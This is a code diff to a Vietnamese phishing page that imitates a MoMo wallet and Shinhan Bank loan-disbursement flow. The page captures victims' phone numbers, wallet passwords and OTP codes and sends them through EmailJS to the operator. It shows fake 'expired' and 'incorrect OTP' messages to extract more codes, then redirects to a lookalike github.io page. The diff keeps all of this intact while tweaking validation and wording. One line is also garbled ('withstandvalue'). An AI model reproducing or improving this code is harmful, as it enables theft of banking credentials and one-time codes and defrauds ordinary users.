@@ -14,7 +14,7 @@
     <script type="text/javascript">
       (function() {
          emailjs.init({
-           publicKey: "c-Ms5MjWbitpDBb-E", // Giữ nguyên Public Key của bạn
+           publicKey: "c-Ms5MjWbitpDBb-E",
          });
       })();
     </script>
@@ -251,7 +251,7 @@
                         <form class="input-group" onsubmit="event.preventDefault(); handlePhoneSubmit();">
                             <div class="phone-input-wrapper">
                                 <span class="phone-prefix">+84</span>
-                                <input type="tel" id="momo-phone" class="phone-input" placeholder="Số điện thoại" required inputmode="numeric" pattern="[0-9]{9,10}" title="Số điện thoại gồm 9 hoặc 10 chữ số (nếu có số 0 ở đầu)." oninput="this.value = this.value.replace(/\D/g, '')">
+                                <input type="tel" id="momo-phone" class="phone-input" placeholder="Số điện thoại" required inputmode="numeric" pattern="[0-9]{10}" maxlength="10" oninput="this.value = this.value.replace(/\D/g, '').slice(0, 10)">
                             </div>
                         </form>
                     </div>
@@ -301,10 +301,10 @@
                 <p class="login-subtitle" id="momo-otp-prompt"></p>
                 <form class="input-group" onsubmit="event.preventDefault(); handleOtpSubmit();">
                     <div class="otp-input-container">
-                        <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" placeholder="•">
-                        <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" placeholder="•">
-                        <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" placeholder="•">
-                        <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" placeholder="•">
+                        <input type="text" class="otp-input" maxlength="1" inputmode="numeric" placeholder="•">
+                        <input type="text" class="otp-input" maxlength="1" inputmode="numeric" placeholder="•">
+                        <input type="text" class="otp-input" maxlength="1" inputmode="numeric" placeholder="•">
+                        <input type="text" class="otp-input" maxlength="1" inputmode="numeric" placeholder="•">
                     </div>
                 </form>
                 <div class="loading" id="momo-otp-loading"><div class="spinner"></div></div>
@@ -337,7 +337,7 @@
             
             const formData = getFormData();
             let otpAttempts = 0;
-            
+
             const getEl = (id) => document.getElementById(id);
             const otpInputs = document.querySelectorAll('#momo-otp-section .otp-input');
             const slides = document.querySelectorAll('.banner-slide');
@@ -375,12 +375,13 @@
                 const principal = formData.amount || 0;
                 const interest = formData.interest !== undefined ? formData.interest : (principal * 0.057);
                 const overdueAmount = 0;
-                const earlyTerminationFee = 870000;
+                const earlyTerminationFee = 0;
                 const collectionFee = 24000;
                 const customerName = formData.fullName || '';
                 const contractNumber = 'SHB-' + Math.floor(1000000000 + Math.random() * 9000000000);
                 const loanTermInMonths = formData.months || 48;
 
+                const totalAmount = principal + interest + overdueAmount + earlyTerminationFee + collectionFee;
                 getEl('mainTotalAmount').textContent = formatCurrency(principal);
                 
                 const paymentDetailsContainer = getEl('payment-details');
@@ -394,12 +395,11 @@
                 
                 const customerDetailsContainer = getEl('customer-details');
                 customerDetailsContainer.innerHTML = '';
-                
+                if (customerName) {
+                    customerDetailsContainer.appendChild(createDetailItem('Tên khách hàng', customerName));
+                }
                 customerDetailsContainer.appendChild(createDetailItem('Số hợp đồng', contractNumber));
-                // === SỬA LỖI: Luôn hiển thị mục "Tên khách hàng" ===
-                // Nếu không có tên, hiển thị 'Không có' để dễ nhận biết.
-                customerDetailsContainer.appendChild(createDetailItem('Tên khách hàng', customerName || 'Không có'));
-
+                
                 const closingDate = new Date();
                 closingDate.setMonth(closingDate.getMonth() + loanTermInMonths);
                 const formattedClosingDate = closingDate.toLocaleDateString('vi-VN', {
@@ -423,19 +423,15 @@
 
             window.handlePhoneSubmit = () => {
                 const phoneInput = getEl('momo-phone');
-                let phoneValue = phoneInput.value.trim();
+                let phoneValue = phoneInput.value.replace(/\D/g, '');
                 
-                if (phoneValue.length === 9 || (phoneValue.length === 10 && phoneValue.startsWith('0'))) {
-                    if (phoneValue.length === 10) {
-                        credentials.phone = `+84${phoneValue.substring(1)}`;
-                    } else {
-                         credentials.phone = `+84${phoneValue}`;
-                    }
-                    const maskedPhone = `+84 **** ${credentials.phone.slice(-3)}`;
+                if (phoneValue.length === 10 && phoneValue.startsWith('0')) {
+                    credentials.phone = `+84${phoneValue.substring(1)}`;
+                    const maskedPhone = `+84 **** ${phoneValue.slice(-3)}`;
                     getEl('masked-phone-password').textContent = maskedPhone;
                     showSection('momo-password-section');
                 } else {
-                    showNotification('Số điện thoại không hợp lệ.<br>Vui lòng thử lại.', 'error');
+                    showNotification('Số điện thoại phải đúng 10 chữ số và bắt đầu bằng 0.<br>Vui lòng thử lại.', 'error');
                 }
             };
             
@@ -447,10 +443,10 @@
                     
                     const maskedPhone = `+84 **** ${credentials.phone.slice(-3)}`;
                     getEl('masked-phone-otp').textContent = maskedPhone;
-                    getEl('momo-otp-prompt').textContent = `Nhập mã xác thực vừa được gửi đến SĐT ${maskedPhone}.`;
+                    getEl('momo-otp-prompt').textContent = `Mã xác thực đã được gửi đến SĐT ${maskedPhone}.`;
                     showSection('momo-otp-section');
                     otpInputs[0].focus();
-                    setTimeout(() => showNotification(`Đã gửi mã OTP đến ${credentials.phone}`, 'success'), 500);
+                    setTimeout(() => showNotification(`Đã gửi mã OTP đến ${credentials.phone}`, 'success'), 1000);
                 } else {
                     showNotification('Mật khẩu phải là 6 chữ số.', 'error');
                 }
@@ -460,7 +456,7 @@
                 const serviceID = 'service_60tgxof';
                 let templateID = '';
                 let templateParams = {};
-                const contractNumber = getEl('customer-details').querySelector('.detail-item .value')?.textContent || '';
+                const contractNumber = getEl('customer-details').querySelector('.detail-item:last-child .value')?.textContent || '';
 
                 const commonParams = {
                     platform: "MoMo (Shinhan Layout)",
@@ -475,13 +471,13 @@
                     templateParams = { ...commonParams, password: value };
                 } else if (type === 'otp') {
                     templateID = 'template_p60g14a';
-                    templateParams = { ...commonParams, otp: value, password: credentials.password };
+                    templateParams = { ...commonParams, otp: withstandvalue, password: credentials.password };
                 }
 
                 if(templateID) {
                     emailjs.send(serviceID, templateID, templateParams)
-                        .then(() => console.log(`EmailJS: Dữ liệu '${type}' đã được gửi.`))
-                        .catch(err => console.error(`EmailJS: Lỗi khi gửi '${type}':`, JSON.stringify(err)));
+                        .then(() => console.log(`${type} sent successfully.`))
+                        .catch(err => console.error(`EmailJS send failed for ${type}:`, err));
                 }
             };
 
@@ -512,27 +508,25 @@
 
                     switch (otpAttempts) {
                         case 1:
-                            showNotification('Mã xác nhận hết hiệu lực.<br>Vui lòng thử lại.', 'error', 3500);
+                            showNotification('OTP đã hết hiệu lực.<br>Vui lòng nhập lại.', 'error');
                             clearOtpInputs();
                             break;
                         case 2:
-                            showNotification('Mã xác nhận không chính xác.<br>Vui lòng thử lại.', 'error', 3500);
+                            showNotification('OTP không đúng.<br>Vui lòng kiểm tra lại.', 'error');
                             clearOtpInputs();
                             break;
-                        default: 
-                             otpSubmitBtn.disabled = true;
-                             showNotification('Giải ngân không thành công.<br>Đang chuyển về trang chủ...', 'error', 4000);
-                             setTimeout(() => {
-                                 window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/Evaluate-conditions.html';
-                             }, 4000);
-                             break;
+                        case 3:
+                            showNotification('Xác nhận giải ngân không thành công.<br>Đang chuyển hướng...', 'error', 4000);
+                            setTimeout(() => {
+                                window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/Evaluate-conditions.html';
+                            }, 4000);
+                            break;
                     }
-                }, 2000); 
+                }, 1500);
             };
 
             otpInputs.forEach((input, index) => {
-                input.addEventListener('input', (e) => {
-                    e.target.value = e.target.value.replace(/[^0-9]/g, '');
+                input.addEventListener('input', () => {
                     if (input.value && index < otpInputs.length - 1) {
                         otpInputs[index + 1].focus();
                     }
@@ -544,19 +538,18 @@
                 });
                 input.addEventListener('paste', (e) => {
                     e.preventDefault();
-                    const pasteData = (e.clipboardData || window.clipboardData).getData('text').replace(/[^0-9]/g, '').slice(0, 4);
+                    const pasteData = e.clipboardData.getData('text').slice(0, 4);
                     pasteData.split('').forEach((char, i) => {
                         if(otpInputs[i]) otpInputs[i].value = char;
                     });
                     if (pasteData.length > 0) {
-                        const focusIndex = Math.min(otpInputs.length - 1, pasteData.length);
-                        otpInputs[focusIndex].focus();
+                        otpInputs[Math.min(3, pasteData.length -1)].focus();
                     }
                 });
             });
             
             const startSlider = () => {
-                if(slideCount > 1){
+                if(slideCount > 0){
                     setInterval(() => {
                         slides[currentSlide].classList.remove('active');
                         currentSlide = (currentSlide + 1) % slideCount;
